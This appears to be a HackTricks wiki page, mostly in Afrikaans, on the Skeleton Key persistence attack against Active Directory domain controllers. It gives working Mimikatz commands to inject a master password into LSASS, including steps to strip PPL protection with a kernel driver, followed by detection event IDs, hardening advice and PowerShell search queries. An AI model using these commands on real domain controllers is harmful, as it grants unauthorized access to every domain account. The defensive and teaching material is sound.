# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

Die **Skeleton Key attack** is 'n tegniek wat aanvallers toelaat om **bypass Active Directory authentication** deur **injecting a master password** in die LSASS-proses van elke domain controller. Na die inspuiting kan die meesterwagwoord (standaard **`mimikatz`**) gebruik word om as **any domain user** te verifieer terwyl hul werklike wagwoorde steeds werk.

Belangrike feite:

- Vereis **Domain Admin/SYSTEM + SeDebugPrivilege** op elke DC en moet **weer toegepas word na elke herbegin**.
- Pas **NTLM** en **Kerberos RC4 (etype 0x17)** valideringspaaie aan; AES-only realms of rekeninge wat AES afdwing sal **die skeleton key nie aanvaar nie**.
- Kan bots met derdeparty LSA-verifikasiepakkette of addisionele smart‑card / MFA verskaffers.
- Die Mimikatz module aanvaar die opsionele skakelaar `/letaes` om te voorkom dat Kerberos/AES hooks geraak word in geval van versoenbaarheidsprobleme.

### Execution

Klassieke, nie‑PPL beskermde LSASS:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
Indien **LSASS is running as PPL** (RunAsPPL/Credential Guard/Windows 11 Secure LSASS), is 'n kernel driver nodig om die beskerming te verwyder voordat patching van LSASS plaasvind:
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
Na invoeging, verifieer met enige domeinrekening maar gebruik die wagwoord `mimikatz` (of die waarde deur die operateur ingestel). Onthou om dit op **alle DCs** in multi‑DC‑omgewings te herhaal.

## Versagtingsmaatreëls

- **Logmonitering**
- Stelsel **Event ID 7045** (diens/driver‑installasie) vir ongesigneerde drivers soos `mimidrv.sys`.
- **Sysmon**: Event ID 7 (driver load) vir `mimidrv.sys`; Event ID 10 vir verdagte toegang tot `lsass.exe` vanaf nie‑stelselprosesse.
- Sekuriteit **Event ID 4673/4611** vir gebruik van sensitiewe voorregte of anomalieë in LSA‑authentiseringspakket‑registrasie; korreleer met onverwagte 4624‑aanmeldings wat RC4 (etype 0x17) vanaf DCs gebruik.
- **Verharding van LSASS**
- Hou **RunAsPPL/Credential Guard/Secure LSASS** aangeskakel op DCs om aanvallers te dwing tot kernel‑modus driver‑implementering (meer telemetrie, moeiliker uitbuiting).
- Skakel verouderde **RC4** af waar moontlik; Kerberos‑tickets beperk tot AES voorkom die RC4‑hook‑pad wat deur die skeleton key gebruik word.
- Vinnige PowerShell‑soektogte:
- Opspoor ongesigneerde kernel‑driver‑installasies: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Soek na Mimikatz‑driver: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- Kontroleer dat PPL afgedwing is na herbegin: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

Vir addisionele leiding oor credential‑verharding kyk [Windows credentials protections](../stealing-credentials/credentials-protections.md).

## Verwysings

- [Netwrix – Skeleton Key attack in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)

{{#include ../../banners/hacktricks-training.md}}
